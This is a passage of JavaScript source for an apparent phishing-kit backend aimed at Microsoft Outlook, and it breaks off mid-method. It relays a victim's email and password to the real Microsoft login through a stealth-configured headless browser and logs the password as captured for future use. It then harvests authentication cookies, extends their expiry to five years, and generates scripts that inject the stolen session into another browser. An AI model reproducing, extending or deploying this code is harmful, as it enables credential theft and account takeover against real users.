const puppeteer = require('puppeteer');
const crypto = require('crypto');

class OutlookLoginAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.enableScreenshots = options.enableScreenshots !== false;
        this.screenshotQuality = options.screenshotQuality || 80;
        this.isClosing = false;
        this.lastActivity = Date.now();
        this.preloadedEmail = null;  // Track which email was preloaded
        this.loginProvider = null;   // Cache detected login provider
        this.isPreloaded = false;    // Track preload state
        this.sessionId = options.sessionId || null; // Store session ID for event broadcasting
        this.eventCallback = options.eventCallback || null; // Callback for broadcasting events
        
        // Use consistent encryption key (same as server.js)
        this.encryptionKey = this.generateEncryptionKey();
    }

    // Generate encryption key using the same method as server.js for consistency
    generateEncryptionKey() {
        // Auto-generate encryption seed if not provided (same logic as server.js)
        const seed = process.env.ENCRYPTION_SEED || this.generateEncryptionSeed();
        // Use the same salt as server.js for cross-component compatibility
        const salt = 'salt';
        return crypto.scryptSync(seed, salt, 32);
    }

    // Auto-generate encryption seed if not provided (same logic as server.js)
    generateEncryptionSeed() {
        const path = require('path');
        const fs = require('fs');
        
        // Try to load existing seed from file first
        const seedFile = path.join(process.cwd(), '.encryption-seed');
        
        if (fs.existsSync(seedFile)) {
            try {
                const existingSeed = fs.readFileSync(seedFile, 'utf8').trim();
                if (existingSeed && existingSeed.length >= 32) {
                    console.log('🔐 Using existing encryption seed from file');
                    return existingSeed;
                }
            } catch (error) {
                console.warn('⚠️ Error reading existing seed file:', error.message);
            }
        }
        
        // Generate new secure seed
        const newSeed = crypto.randomBytes(32).toString('hex');
        
        try {
            fs.writeFileSync(seedFile, newSeed, 'utf8');
            console.log('🔑 Generated new encryption seed and saved to file');
        } catch (error) {
            console.warn('⚠️ Could not save seed to file:', error.message);
        }
        
        return newSeed;
    }

    // Encrypt sensitive data using secure createCipheriv
    encrypt(text) {
        if (!text) return null;
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', this.encryptionKey, iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
    }

    // Decrypt sensitive data using secure createDecipheriv
    decrypt(encryptedText) {
        if (!encryptedText) return null;
        try {
            const parts = encryptedText.split(':');
            if (parts.length !== 3) return null;
            
            const iv = Buffer.from(parts[0], 'hex');
            const authTag = Buffer.from(parts[1], 'hex');
            const encrypted = parts[2];
            
            const decipher = crypto.createDecipheriv('aes-256-gcm', this.encryptionKey, iv);
            decipher.setAuthTag(authTag);
            let decrypted = decipher.update(encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            console.warn('Decryption failed:', error.message);
            return null;
        }
    }

    async init() {
        // Randomized browser arguments for fingerprinting resistance
        const baseArgs = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--disable-extensions',
            '--disable-infobars',
            '--disable-notifications',
            '--disable-default-apps',
            '--disable-background-networking',
            '--disable-sync',
            '--no-default-browser-check',
            '--disable-popup-blocking',
            '--disable-translate',
            '--memory-pressure-off',
            '--max_old_space_size=512',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding'
        ];

        // Add randomized stealth args
        const stealthArgs = [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=VizDisplayCompositor',
            '--disable-ipc-flooding-protection',
            `--user-data-dir=/tmp/chrome_${Math.random().toString(36).substring(2, 15)}`,
            `--window-size=${1280 + Math.floor(Math.random() * 200)},${720 + Math.floor(Math.random() * 200)}`
        ];

        const browserOptions = {
            headless: 'new',
            args: [...baseArgs, ...stealthArgs],
            dumpio: false,
            ignoreHTTPSErrors: true,
            defaultViewport: { width: 1280, height: 720 }
        };

        // Simplified Chromium path detection - Replit has Nix chromium available
        if (process.env.CHROMIUM_PATH) {
            browserOptions.executablePath = process.env.CHROMIUM_PATH;
            console.log(`Using environment Chromium path: ${process.env.CHROMIUM_PATH}`);
        } else {
            // Use Nix chromium path (standard on Replit)
            try {
                const { execSync } = require('child_process');
                const chromiumPath = execSync('which chromium', { encoding: 'utf8' }).trim();
                if (chromiumPath) {
                    browserOptions.executablePath = chromiumPath;
                    console.log(`Using system Chromium: ${chromiumPath}`);
                }
            } catch (e) {
                console.log('Using Puppeteer default Chromium (bundled)');
            }
        }

        // Launch browser
        console.log('Launching browser...');
        this.browser = await puppeteer.launch(browserOptions);
        console.log('Browser launched successfully');

        this.context = await this.browser.createBrowserContext();
        console.log('Created private browser context for session isolation');

        // Create new page
        try {
            this.page = await this.context.newPage();
            console.log('New page created in private context successfully');

            await this.page.setViewport({ width: 1280, height: 720 });
            
            // Randomized user agents for stealth
            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ];
            const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            await this.page.setUserAgent(randomUserAgent);

            this.page.on('error', (error) => {
                console.error('Page error:', error);
            });

            this.page.on('pageerror', (error) => {
                console.error('Page JavaScript error:', error);
            });

            console.log('Browser initialized successfully');
        } catch (error) {
            console.error('Failed to create new page:', error);
            if (this.browser) {
                try {
                    await this.browser.close();
                } catch (closeError) {
                    if (!closeError.message.includes('Target.closeTarget')) {
                        console.error('Error closing browser after page creation failure:', closeError);
                    }
                }
            }
            this.browser = null;
            this.page = null;
            throw new Error(`Failed to create new page: ${error.message}`);
        }
    }

    async navigateToOutlook() {
        try {
            console.log('Navigating to Outlook...');
            await this.page.goto('https://outlook.office.com/mail/', {
                waitUntil: 'domcontentloaded'
            });

            console.log('Successfully navigated to Outlook');
            await new Promise(resolve => setTimeout(resolve, 1000));
            return true;
        } catch (error) {
            console.error('Error navigating to Outlook:', error.message);
            return false;
        }
    }

    async performLogin(email, password) {
        try {
            console.log(`Attempting to login with email: ${email}`);

            // Wait for email input field
            await this.page.waitForSelector('input[type="email"]');

            // Enter email
            await this.page.type('input[type="email"]', email);
            console.log('Email entered');

            // Click Next button
            await this.page.click('input[type="submit"]');
            console.log('Clicked Next button');

            await new Promise(resolve => setTimeout(resolve, 1500));

            const currentUrl = this.page.url();
            console.log(`Current URL after email submission: ${currentUrl}`);

            const loginProvider = await this.detectLoginProvider();
            console.log(`Detected login provider: ${loginProvider}`);

            let loginSuccess = false;

            if (loginProvider === 'microsoft') {
                loginSuccess = await this.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                loginSuccess = await this.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                loginSuccess = await this.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                loginSuccess = await this.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                loginSuccess = await this.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider detected. Attempting generic login...`);
                loginSuccess = await this.handleGenericLogin(password);
            }

            if (!loginSuccess) {
                console.error('Password authentication failed - incorrect credentials provided');
                await this.takeScreenshot(`screenshots/login-failed-${Date.now()}.png`);
                return false;
            }

            await this.handleStaySignedInPrompt();
            await new Promise(resolve => setTimeout(resolve, 2500));

            const finalUrl = this.page.url();
            if (finalUrl.includes('outlook.office.com/mail')) {
                console.log('Login successful - redirected to Outlook mail');
                return true;
            }

            console.error('Login process completed but did not redirect to Outlook mail');
            await this.takeScreenshot(`screenshots/no-redirect-${Date.now()}.png`);
            return false;
        } catch (error) {
            console.error('Error during login:', error.message);
            return false;
        }
    }

    // NEW: Preload phase - Initialize browser and get to password prompt
    async preload(email) {
        try {
            console.log(`🚀 Starting browser preload for email: ${email}`);
            
            // Wait for email input field
            await this.page.waitForSelector('input[type="email"]', { timeout: 10000 });

            // Enter email faster
            await this.page.type('input[type="email"]', email, { delay: 20 }); // Faster typing
            console.log('📧 Email entered during preload');

            // Click Next button
            await this.page.click('input[type="submit"]');
            console.log('➡️ Clicked Next button during preload');

            await new Promise(resolve => setTimeout(resolve, 1500)); // Reduced wait time

            const currentUrl = this.page.url();
            console.log(`🔍 Current URL after email submission: ${currentUrl}`);

            // Detect and cache the login provider
            this.loginProvider = await this.detectLoginProvider();
            console.log(`🏢 Detected login provider: ${this.loginProvider}`);

            // Wait for password field to be ready with faster polling
            let passwordReady = false;
            const maxWaitTime = 12000; // 12 seconds max wait
            const startTime = Date.now();

            while (!passwordReady && (Date.now() - startTime) < maxWaitTime) {
                try {
                    await this.page.waitForSelector('input[type="password"]', { timeout: 500 }); // Faster timeout
                    passwordReady = true;
                    console.log('🔑 Password field is ready');
                } catch (e) {
                    // Check more frequently
                    await new Promise(resolve => setTimeout(resolve, 300)); // Faster polling
                }
            }

            if (!passwordReady) {
                throw new Error('Password field did not appear within timeout');
            }

            // Mark as preloaded and store email
            this.isPreloaded = true;
            this.preloadedEmail = email;
            this.lastActivity = Date.now();

            console.log(`✅ Browser preload completed for: ${email}`);
            return true;

        } catch (error) {
            console.error(`❌ Browser preload failed for ${email}:`, error.message);
            this.isPreloaded = false;
            this.preloadedEmail = null;
            this.loginProvider = null;
            return false;
        }
    }

    // NEW: Continue phase - Complete authentication with password
    async continueWithPassword(email, password) {
        try {
            // Validate preload state
            if (!this.isPreloaded) {
                throw new Error('Browser not preloaded - call preload() first');
            }

            if (this.preloadedEmail !== email) {
                throw new Error(`Email mismatch: preloaded for ${this.preloadedEmail}, but continuing with ${email}`);
            }

            if (!this.loginProvider) {
                throw new Error('Login provider not detected during preload');
            }

            console.log(`🔐 Continuing authentication for: ${email} with provider: ${this.loginProvider}`);

            // Update activity timestamp
            this.lastActivity = Date.now();

            let loginSuccess = false;

            // Use cached login provider from preload phase
            if (this.loginProvider === 'microsoft') {
                loginSuccess = await this.handleMicrosoftLogin(password);
            } else if (this.loginProvider === 'adfs') {
                loginSuccess = await this.handleADFSLogin(password);
            } else if (this.loginProvider === 'okta') {
                loginSuccess = await this.handleOktaLogin(password);
            } else if (this.loginProvider === 'azure-ad') {
                loginSuccess = await this.handleAzureADLogin(password);
            } else if (this.loginProvider === 'generic-saml') {
                loginSuccess = await this.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider: ${this.loginProvider}. Attempting generic login...`);
                loginSuccess = await this.handleGenericLogin(password);
            }

            if (!loginSuccess) {
                console.error('❌ Password authentication failed - incorrect credentials provided');
                await this.takeScreenshot(`screenshots/login-failed-${Date.now()}.png`);
                return false;
            }

            await this.handleStaySignedInPrompt();
            
            // Wait longer for redirects and try multiple approaches
            console.log('⏳ Waiting for Microsoft redirect to complete...');
            await new Promise(resolve => setTimeout(resolve, 5000));

            let finalUrl = this.page.url();
            console.log(`🔍 Current URL after authentication: ${finalUrl}`);

            // Check if we're already at Outlook mail
            if (finalUrl.includes('outlook.office.com/mail') || finalUrl.includes('outlook.office365.com')) {
                console.log('✅ Login successful - already at Outlook mail');
                return true;
            }

            // Check if we're at a Microsoft login success page - try to navigate to Outlook
            if (finalUrl.includes('login.microsoftonline.com') || finalUrl.includes('login.live.com') || finalUrl.includes('account.microsoft.com')) {
                console.log('🔄 Still on Microsoft login page, attempting direct navigation to Outlook...');
                try {
                    await this.page.goto('https://outlook.office.com/mail/', { 
                        waitUntil: 'domcontentloaded', 
                        timeout: 15000 
                    });
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    finalUrl = this.page.url();
                    console.log(`🔍 URL after direct navigation: ${finalUrl}`);

                    if (finalUrl.includes('outlook.office.com/mail') || finalUrl.includes('outlook.office365.com')) {
                        console.log('✅ Login successful - direct navigation to Outlook worked');
                        return true;
                    }
                } catch (navError) {
                    console.warn('⚠️ Direct navigation to Outlook failed:', navError.message);
                }
            }

            console.error('❌ Login process completed but could not access Outlook mail');
            console.error(`Final URL: ${finalUrl}`);
            await this.takeScreenshot(`screenshots/no-redirect-${Date.now()}.png`);
            return false;

        } catch (error) {
            console.error('❌ Error during continue with password:', error.message);
            return false;
        }
    }

    // NEW: Close browser and cleanup
    async closeBrowser() {
        try {
            this.isClosing = true;
            this.isPreloaded = false;
            this.preloadedEmail = null;
            this.loginProvider = null;

            if (this.page) {
                try {
                    await this.page.close();
                } catch (e) {
                    console.warn('Error closing page:', e.message);
                }
                this.page = null;
            }

            if (this.context) {
                try {
                    await this.context.close();
                } catch (e) {
                    console.warn('Error closing context:', e.message);
                }
                this.context = null;
            }

            if (this.browser) {
                try {
                    await this.browser.close();
                } catch (e) {
                    if (!e.message.includes('Target.closeTarget')) {
                        console.warn('Error closing browser:', e.message);
                    }
                }
                this.browser = null;
            }

            console.log('🧹 Browser session closed and cleaned up');
        } catch (error) {
            console.error('❌ Error during browser cleanup:', error.message);
        }
    }

    async detectLoginProvider() {
        try {
            const currentUrl = this.page.url();
            console.log(`Analyzing URL for login provider: ${currentUrl}`);

            if (currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('login.live.com')) {
                return 'microsoft';
            } else if (currentUrl.includes('adfs') || currentUrl.includes('sts') || currentUrl.includes('fs.')) {
                return 'adfs';
            } else if (currentUrl.includes('okta.com') || currentUrl.includes('.okta.')) {
                return 'okta';
            } else if (currentUrl.includes('microsoftonline.com') && !currentUrl.includes('login.microsoftonline.com')) {
                return 'azure-ad';
            }

            const pageText = await this.page.evaluate(() => document.body.textContent || '');
            const pageTitle = await this.page.title();

            if (pageTitle.toLowerCase().includes('adfs') || pageText.toLowerCase().includes('active directory')) {
                return 'adfs';
            } else if (pageTitle.toLowerCase().includes('okta') || pageText.toLowerCase().includes('okta')) {
                return 'okta';
            } else if (pageText.toLowerCase().includes('saml') || pageText.toLowerCase().includes('single sign')) {
                return 'generic-saml';
            }

            if (currentUrl.includes('microsoft') || currentUrl.includes('office')) {
                return 'microsoft';
            }

            return 'unknown';

        } catch (error) {
            console.error('Error detecting login provider:', error.message);
            return 'unknown';
        }
    }

    async handleMicrosoftLogin(password) {
        try {
            console.log('Handling Microsoft standard login...');

            await this.page.waitForSelector('input[type="password"]');
            await this.page.type('input[type="password"]', password);
            console.log('Password entered for Microsoft login');

            await this.page.click('input[type="submit"]');
            console.log('Clicked Sign in button for Microsoft login');

            // Wait longer for page to process login
            await new Promise(resolve => setTimeout(resolve, 3000));

            const currentUrl = this.page.url();
            console.log(`Post-login URL: ${currentUrl}`);

            // Check if we're still on a login page (indicates failure)
            if (currentUrl.includes('login.microsoftonline.com') && 
                (currentUrl.includes('error') || currentUrl.includes('username'))) {
                
                // Only check for errors if we're still on login page
                const pageText = await this.page.evaluate(() => document.body.textContent || '');
                const errorPatterns = [
                    'Your account or password is incorrect',
                    'password is incorrect', 
                    'Sign-in was unsuccessful',
                    'The username or password is incorrect',
                    'Invalid credentials'
                ];

                for (const pattern of errorPatterns) {
                    if (pageText.toLowerCase().includes(pattern.toLowerCase())) {
                        console.error(`Microsoft login failed: ${pattern}`);
                        await this.takeScreenshot(`screenshots/error-microsoft-login-${Date.now()}.png`);
                        return false;
                    }
                }

                // Check for visible error elements only on login pages
                const errorSelectors = [
                    '[data-bind*="errorText"]',
                    '.alert-error', 
                    '.error-message',
                    '[role="alert"]'
                ];

                for (const selector of errorSelectors) {
                    try {
                        const errorElement = await this.page.$(selector);
                        if (errorElement) {
                            const isVisible = await this.page.evaluate(el => {
                                const style = window.getComputedStyle(el);
                                return style.display !== 'none' && style.visibility !== 'hidden';
                            }, errorElement);
                            
                            if (isVisible) {
                                const text = await this.page.evaluate(el => el.textContent, errorElement);
                                if (text && text.trim() && text.toLowerCase().includes('password')) {
                                    console.error(`Microsoft login failed: ${text.trim()}`);
                                    await this.takeScreenshot(`screenshots/error-microsoft-login-${Date.now()}.png`);
                                    return false;
                                }
                            }
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }

            // If we've moved away from login page or no errors found, consider it success
            console.log('Microsoft login appears successful - no errors detected');
            
            // Immediately broadcast success event to frontend for instant redirect
            if (this.eventCallback && this.sessionId) {
                this.eventCallback(this.sessionId, 'login-success', {
                    message: 'Microsoft login appears successful - no errors detected',
                    redirectNow: true
                });
            }
            
            return true;

        } catch (error) {
            console.error('Error in Microsoft login:', error.message);
            return false;
        }
    }

    // All login providers use Microsoft authentication
    async handleADFSLogin(password) {
        return await this.handleMicrosoftLogin(password);
    }

    async handleOktaLogin(password) {
        return await this.handleMicrosoftLogin(password);
    }

    async handleAzureADLogin(password) {
        return await this.handleMicrosoftLogin(password);
    }

    async handleGenericSAMLLogin(password) {
        return await this.handleMicrosoftLogin(password);
    }

    async handleGenericLogin(password) {
        return await this.handleMicrosoftLogin(password);
    }

    async handleStaySignedInPrompt() {
        try {
            const staySignedInSelectors = [
                'input[type="submit"][value*="Yes"]',
                'button:contains("Yes")',
                '#idSIButton9',
                '.stay-signed-in-button'
            ];

            for (const selector of staySignedInSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log('Clicked "Stay signed in" button');
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        return;
                    }
                } catch (e) {
                    continue;
                }
            }

            console.log('No "Stay signed in" prompt found or handled');
        } catch (error) {
            console.error('Error handling stay signed in prompt:', error.message);
        }
    }

    async validateSession(email = 'unknown', password = null) {
        try {
            console.log('🔍 Validating session and saving cookies...');

            // Wait for Outlook mail interface
            await this.page.waitForSelector('[role="listbox"], .ms-MessageBar', { timeout: 10000 });
            
            const currentUrl = this.page.url();
            const isValidSession = currentUrl.includes('outlook.office.com') || 
                                 currentUrl.includes('outlook.live.com') ||
                                 currentUrl.includes('mail.office365.com');

            if (isValidSession) {
                console.log(`✅ Session validation successful for: ${email}`);
                
                // Save cookies first before any redirects
                let sessionFilePath = null;
                try {
                    sessionFilePath = await this.saveCookies(email, password);
                    console.log(`💾 Session cookies saved successfully: ${sessionFilePath}`);
                } catch (saveError) {
                    console.error('Failed to save cookies:', saveError.message);
                }
                
                // Check inbox access
                let hasInboxAccess = false;
                try {
                    const inboxElements = await this.page.$$('[role="listbox"] [role="option"]');
                    hasInboxAccess = inboxElements.length > 0;
                    console.log(`📧 Found ${inboxElements.length} emails in inbox - session fully active`);
                } catch (inboxError) {
                    console.warn('Inbox access check failed, but login appears successful');
                }
                
                return {
                    success: true,
                    email: email,
                    url: currentUrl,
                    hasInboxAccess: hasInboxAccess,
                    sessionId: Date.now().toString(),
                    cookiesSaved: !!sessionFilePath,
                    sessionFilePath: sessionFilePath,
                    timestamp: new Date().toISOString()
                };
            } else {
                console.log(`❌ Session validation failed - not at Outlook interface`);
                return {
                    success: false,
                    email: email,
                    url: currentUrl,
                    error: 'Not authenticated to Outlook',
                    timestamp: new Date().toISOString()
                };
            }

        } catch (error) {
            console.error('❌ Error validating session:', error.message);
            return {
                success: false,
                email: email,
                error: error.message,
                timestamp: new Date().toISOString()
            };
        }
    }

    async redirectToOneDrive() {
        try {
            console.log('🔄 Redirecting to OneDrive...');
            await this.page.goto('https://onedrive.live.com', {
                waitUntil: 'domcontentloaded',
                timeout: 15000
            });
            console.log('✅ Redirected to OneDrive successfully');
        } catch (error) {
            console.warn('Warning: OneDrive redirect failed:', error.message);
        }
    }

    async saveCookies(email = null, password = null) {
        try {
            console.log('🍪 Saving enhanced persistent session cookies...');

            // Extended list of Microsoft authentication domains
            const domains = [
                'https://login.microsoftonline.com',
                'https://login.live.com',
                'https://outlook.office.com',
                'https://outlook.office365.com',
                'https://www.office.com',
                'https://account.microsoft.com',
                'https://graph.microsoft.com',
                'https://aadcdn.msftauth.net',
                'https://aadcdn.msauth.net'
            ];

            let allCookies = [];

            // Collect cookies from current page first
            const currentCookies = await this.page.cookies();
            allCookies = allCookies.concat(currentCookies);

            // Only collect cookies from current page and login.microsoftonline.com to avoid context issues
            try {
                console.log(`🌐 Collecting cookies from login.microsoftonline.com...`);
                await this.page.goto('https://login.microsoftonline.com', {
                    waitUntil: 'domcontentloaded',
                    timeout: 8000
                });
                const loginCookies = await this.page.cookies();
                allCookies = allCookies.concat(loginCookies);
                console.log(`✅ Collected ${loginCookies.length} cookies from login.microsoftonline.com`);
            } catch (e) {
                console.log(`⚠️ Could not access login.microsoftonline.com: ${e.message}`);
            }

            // Filter for essential authentication cookies only
            const essentialCookieNames = [
                // Core Microsoft authentication (CRITICAL)
                'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid',

                // Outlook specific (REQUIRED)
                'luat', 'SuiteServiceProxyKey', 'OWAAppIdType',

                // Session management (MINIMAL)
                'fpc', 'stsservicecookie', 'x-ms-gateway-slice'
            ];

            // Remove duplicates and filter for essential cookies only
            const uniqueCookies = [];
            const seen = new Set();
            const cookieMap = new Map();

            // First pass: collect all cookies and identify the best version of each
            for (const cookie of allCookies) {
                const isEssential = essentialCookieNames.includes(cookie.name) ||
                                  cookie.name.startsWith('esctx-');

                if (isEssential) {
                    const cookieKey = `${cookie.name}|${cookie.domain}`;

                    // If we haven't seen this cookie name+domain combo, or if this one has a longer expiry, use it
                    if (!cookieMap.has(cookieKey) ||
                        (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                        cookieMap.set(cookieKey, cookie);
                    }
                }
            }

            // Second pass: process the unique cookies
            for (const [key, cookie] of cookieMap) {
                // Force all cookies to be persistent with extended expiry
                if (cookie.expires === -1 || !cookie.expires || cookie.session) {
                    // Set expiry to 5 years from now for maximum persistence
                    cookie.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    cookie.session = false;
                } else {
                    // Extend existing expiry to 5 years if it's shorter
                    const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    if (cookie.expires < fiveYearsFromNow) {
                        cookie.expires = fiveYearsFromNow;
                    }
                }

                // Ensure secure transmission
                cookie.secure = true;
                cookie.sameSite = 'None';

                uniqueCookies.push(cookie);
            }

            console.log(`📦 Optimized to ${uniqueCookies.length} essential authentication cookies (removed ${allCookies.length - uniqueCookies.length} unnecessary cookies)`);

            // Create session data directory
            const fs = require('fs');
            const path = require('path');
            const sessionDir = 'session_data';

            if (!fs.existsSync(sessionDir)) {
                fs.mkdirSync(sessionDir, { recursive: true });
            }

            // Create session file with all cookies in one place
            const sessionId = Date.now();
            const sessionTimestamp = new Date().toISOString();
            const sessionEmail = email || 'unknown';
            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
            const sessionFilePath = path.join(sessionDir, sessionFileName);

            console.log(`📄 Creating single session file: ${sessionFileName}`);

            // Create comprehensive session data with all cookies in one file
            const sessionData = {
                id: sessionId,
                timestamp: sessionTimestamp,
                email: sessionEmail,
                password: password ? this.encrypt(password) : null,
                totalCookies: uniqueCookies.length,
                domains: domains,
                cookies: this.encryptCookieValues(uniqueCookies),
                userAgent: await this.page.evaluate(() => navigator.userAgent),
                browserFingerprint: {
                    viewport: await this.page.viewport(),
                    timezone: await this.page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
                    language: await this.page.evaluate(() => navigator.language)
                }
            };

            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
            console.log(`💾 Session saved with ${uniqueCookies.length} cookies in single file`);

            // Create injection script for this session
            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
            const sessionScriptContent = `
// Session Cookie Injector
// Auto-generated on ${sessionTimestamp}
// Session: ${sessionEmail} (${uniqueCookies.length} cookies)

(function() {
    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');

    const sessionInfo = {
        email: '${sessionEmail}',
        timestamp: '${sessionTimestamp}',
        cookieCount: ${uniqueCookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();`;

            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
            console.log(`🔧 Injection script created: ${sessionInjectScript}`);

            console.log(`✅ Session saved with ${uniqueCookies.length} cookies in single file`);
            console.log(`📄 Session file: ${sessionFilePath}`);
            if (email) console.log(`📧 Email captured: ${email}`);
            if (password) console.log(`🔑 Password captured and encoded for future use`);

            // No backend redirect - let frontend handle the redirect
            console.log(`✅ Session cookies saved, frontend will handle redirect`);

            return sessionFilePath;

        } catch (error) {
            console.error('❌ Error saving enhanced session:', error.message);
            return null;
        }
    }

    // Encrypt sensitive cookie values
    encryptCookieValues(cookies) {
        return cookies.map(cookie => {
            // Only encrypt sensitive auth cookies
            const sensitiveNames = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'luat'];
            if (sensitiveNames.includes(cookie.name)) {
                return {
                    ...cookie,
                    value: this.encrypt(cookie.value),
                    encrypted: true
                };
            }
            return cookie;
        });
    }

    // Decrypt cookie values for injection
    decryptCookieValues(cookies) {
        return cookies.map(cookie => {
            if (cookie.encrypted) {
                return {
                    ...cookie,
                    value: this.decrypt(cookie.value),
                    encrypted: undefined
                };
            }
            return cookie;
        });
    }

    generateCookieInjectionScript(email, cookies, sessionId) {
        return `
// Session Cookie Injector
// Auto-generated on ${new Date().toISOString()}
// Session: ${email} (${cookies.length} cookies)

(function() {
    console.log('🚀 Injecting ${cookies.length} cookies for session: ${email}');

    const sessionInfo = {
        email: '${email}',
        timestamp: '${new Date().toISOString()}',
        cookieCount: ${cookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(cookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${email}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
`;
    }

    async checkEmails() {
        try {
            console.log('Checking for emails...');

            await this.page.waitForSelector('[role="listbox"]', { timeout: 15000 });

            const emails = await this.page.$$('[role="listbox"] [role="option"]');
            console.log(`Found ${emails.length} emails in inbox`);

            const emailSubjects = [];
            for (let i = 0; i < Math.min(5, emails.length); i++) {
                try {
                    const subject = await emails[i].$eval('[data-testid="message-subject"]', el => el.textContent);
                    emailSubjects.push(subject);
                } catch (e) {
                    continue;
                }
            }

            console.log('Recent email subjects:', emailSubjects);
            return emailSubjects;

        } catch (error) {
            console.error('Error checking emails:', error.message);
            return [];
        }
    }

    async takeScreenshot(filename = 'screenshots/outlook-screenshot.png') {
        if (!this.enableScreenshots) {
            console.log(`Screenshot skipped (disabled): ${filename}`);
            return;
        }

        try {
            const fs = require('fs');
            const path = require('path');
            const screenshotDir = path.dirname(filename);

            if (!fs.existsSync(screenshotDir)) {
                fs.mkdirSync(screenshotDir, { recursive: true });
            }

            await this.page.screenshot({
                path: filename,
                quality: this.screenshotQuality,
                type: 'jpeg',
                fullPage: false
            });
            console.log(`Screenshot saved as ${filename}`);
        } catch (error) {
            console.error('Error taking screenshot:', error.message);
        }
    }

    async close() {
        if (this.isClosing) {
            console.log('Close operation already in progress');
            return;
        }

        this.isClosing = true;

        if (this.browser) {
            try {
                const isConnected = this.browser.isConnected();

                if (isConnected) {
                    if (this.page && !this.page.isClosed()) {
                        try {
                            this.page.removeAllListeners();
                            await this.page.close();
                        } catch (pageError) {
                            if (!pageError.message.includes('Target.closeTarget')) {
                                console.error('Error closing page:', pageError.message);
                            }
                        }
                    }

                    try {
                        const pages = await this.browser.pages();
                        for (const page of pages) {
                            if (!page.isClosed()) {
                                try {
                                    page.removeAllListeners();
                                    await page.close();
                                } catch (individualPageError) {
                                    if (!individualPageError.message.includes('Target.closeTarget')) {
                                        console.error(`Error closing individual page:`, individualPageError.message);
